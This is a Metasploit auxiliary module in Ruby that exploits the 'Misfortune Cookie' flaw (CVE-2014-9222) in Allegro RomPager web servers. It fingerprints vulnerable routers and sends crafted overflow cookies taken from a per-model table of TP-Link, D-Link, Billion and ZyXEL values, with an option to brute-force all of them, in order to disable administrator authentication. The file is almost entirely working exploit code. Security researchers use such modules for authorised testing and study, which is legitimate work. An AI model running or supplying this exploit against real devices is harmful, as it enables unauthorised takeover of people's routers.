##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => "Allegro Software RomPager 'Misfortune Cookie' (CVE-2014-9222) Authentication Bypass",
        'Description' => %q{
          This module exploits HTTP servers that appear to be vulnerable to the
          'Misfortune Cookie' vulnerability which affects Allegro Software
          Rompager versions before 4.34 and can allow attackers to authenticate
          to the HTTP service as an administrator without providing valid
          credentials.
        },
        'Author' => [
          'Jon Hart <jon_hart[at]rapid7.com>', # metasploit scanner module
          'Jan Trencansky <jan.trencansky[at]gmail.com>', # metasploit auxiliary admin module
          'Lior Oppenheim' # CVE-2014-9222
        ],
        'References' => [
          ['CVE', '2014-9222'],
          ['URL', 'https://web.archive.org/web/20191006135858/http://mis.fortunecook.ie/'],
          ['URL', 'https://web.archive.org/web/20190207102911/http://mis.fortunecook.ie/misfortune-cookie-suspected-vulnerable.pdf'], # list of likely vulnerable devices
          ['URL', 'https://web.archive.org/web/20190623150837/http://mis.fortunecook.ie/too-many-cooks-exploiting-tr069_tal-oppenheim_31c3.pdf'] # 31C3 presentation with POC
        ],
        'DisclosureDate' => '2014-12-17',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'URI to test', '/']),
      ], Exploit::Remote::HttpClient
    )

    register_advanced_options(
      [
        Msf::OptBool.new('ForceAttempt', [ false, 'Force exploit attempt for all known cookies', false ]),
      ], Exploit::Remote::HttpClient
    )
  end

  def headers
    {
      'Referer' => full_uri
    }
  end

  # List of known values and models
  def devices_list
    known_devices = {
      :'AZ-D140W' =>
          {
            name: 'Azmoon', model: 'AZ-D140W', values: [
              [107367693, 13]
            ]
          },
      :'BiPAC 5102S' =>
            {
              name: 'Billion', model: 'BiPAC 5102S', values: [
                [107369694, 13]
              ]
            },
      :'BiPAC 5200' =>
            {
              name: 'Billion', model: 'BiPAC 5200', values: [
                [107369545, 9],
                [107371218, 21]
              ]
            },
      :'BiPAC 5200A' =>
            {
              name: 'Billion', model: 'BiPAC 5200A', values: [
                [107366366, 25],
                [107371453, 9]
              ]
            },
      :'BiPAC 5200GR4' =>
            {
              name: 'Billion', model: 'BiPAC 5200GR4', values: [
                [107367690, 21]
              ]
            },
      :'BiPAC 5200SRD' =>
            {
              name: 'Billion', model: 'BiPAC 5200SRD', values: [
                [107368270, 1],
                [107371378, 3],
                [107371218, 13]
              ]
            },
      :'DSL-2520U' =>
            {
              name: 'D-Link', model: 'DSL-2520U', values: [
                [107368902, 25]
              ]
            },
      :'DSL-2600U' =>
            {
              name: 'D-Link', model: 'DSL-2600U', values: [
                [107366496, 13],
                [107360133, 20]
              ]
            },
      :'TD-8616' =>
            {
              name: 'TP-Link', model: 'TD-8616', values: [
                [107371483, 21],
                [107369790, 17],
                [107371161, 1],
                [107371426, 17],
                [107370211, 5],
              ]
            },
      :'TD-8817' =>
            {
              name: 'TP-Link', model: 'TD-8817', values: [
                [107369790, 17],
                [107369788, 1],
                [107369522, 25],
                [107369316, 21],
                [107369321, 9],
                [107351277, 20]
              ]
            },
      :'TD-8820' =>
            {
              name: 'TP-Link', model: 'TD-8820', values: [
                [107369768, 17]
              ]
            },
      :'TD-8840T' =>
            {
              name: 'TP-Link', model: 'TD-8840T', values: [
                [107369845, 5],
                [107369790, 17],
                [107369570, 1],
                [107369766, 1],
                [107369764, 5],
                [107369688, 17]
              ]
            },
      :'TD-W8101G' =>
            {
              name: 'TP-Link', model: 'TD-W8101G', values: [
                [107367772, 37],
                [107367808, 21],
                [107367751, 21],
                [107367749, 13],
                [107367765, 25],
                [107367052, 25],
                [107365835, 1]
              ]
            },
      :'TD-W8151N' =>
            {
              name: 'TP-Link', model: 'TD-W8151N', values: [
                [107353867, 24]
              ]
            },
      :'TD-W8901G' =>
            {
              name: 'TP-Link', model: 'TD-W8901G', values: [
                [107367787, 21],
                [107368013, 5],
                [107367854, 9],
                [107367751, 21],
                [107367749, 13],
                [107367765, 25],
                [107367682, 21],
                [107365835, 1],
                [107367052, 25]
              ]
            },
      :'TD-W8901GB' =>
            {
              name: 'TP-Link', model: 'TD-W8901GB', values: [
                [107367756, 13],
                [107369393, 21]
              ]
            },
      :'TD-W8901N' =>
            {
              name: 'TP-Link', model: 'TD-W8901N', values: [
                [107353880, 0]
              ]
            },
      :'TD-W8951ND' =>
            {
              name: 'TP-Link', model: 'TD-W8951ND', values: [
                [107369839, 25],
                [107369876, 13],
                [107366743, 21],
                [107364759, 25],
                [107364759, 13],
                [107364760, 21]
              ]
            },
      :'TD-W8961NB' =>
            {
              name: 'TP-Link', model: 'TD-W8961NB', values: [
                [107369844, 17],
                [107367629, 21],
                [107366421, 13]
              ]
            },
      :'TD-W8961ND' =>
            {
              name: 'TP-Link', model: 'TD-W8961ND', values: [
                [107369839, 25],
                [107369876, 13],
                [107364732, 25],
                [107364771, 37],
                [107364762, 29],
                [107353880, 0],
                [107353414, 36]
              ]
            },
      :'P-660R-T3 v3' => # This value works on devices with model P-660R-T3 v3 not P-660R-T3 v3s
            {
              name: 'ZyXEL', model: 'P-660R-T3', values: [
                [107369567, 21]
              ]
            },
      :'P-660RU-T3 v2' => # Couldn't verify this
            {
              name: 'ZyXEL', model: 'P-660R-T3', values: [
                [107369567, 21]
              ]
            },
      ALL => # Used when `ForceAttempt` === true
            { name: 'Unknown', model: 'Forced', values: [] }
    }
    # collect all known cookies for a brute force option
    all_cookies = []
    known_devices.collect { |_, v| v[:values] }.each do |list|
      all_cookies += list
    end
    known_devices[:ALL][:values] = all_cookies.uniq
    known_devices
  end

  def check_response_fingerprint(res, fallback_status)
    fp = http_fingerprint(response: res)
    vprint_status("Fingerprint: #{fp}")
    # ensure the fingerprint at least appears vulnerable
    if %r{RomPager/(?<version>[\d.]+)} =~ fp
      vprint_status("#{peer} is RomPager #{version}")
      if Rex::Version.new(version) < Rex::Version.new('4.34') && /realm="(?<model>.+)"/ =~ fp
        return model
      end
    end
    fallback_status
  end

  def run
    res = send_request_raw(
      'uri' => normalize_uri(target_uri.path.to_s),
      'method' => 'GET'
    )
    model = check_response_fingerprint(res, Exploit::CheckCode::Detected)
    if model != Exploit::CheckCode::Detected
      devices = devices_list[model.to_sym]
      devices = devices_list[:ALL] if devices.nil? && datastore['ForceAttempt']
      if !devices.nil?
        print_good("Detected device:#{devices[:name]} #{devices[:model]}")
        devices[:values].each do |value|
          cookie = "C#{value[0]}=#{'B' * value[1]}\x00"
          res = send_request_raw(
            'uri' => normalize_uri(target_uri.path.to_s),
            'method' => 'GET',
            'headers' => headers.merge('Cookie' => cookie)
          )
          if !res.nil? && (res.code <= 302)
            print_good('Good response, please check host, authentication should be disabled')
            break
          else
            print_error('Bad response')
          end
        end
      else
        print_error("No matching values for fingerprint #{model}")
      end
    else
      print_error('Unknown device')
    end
  end
end
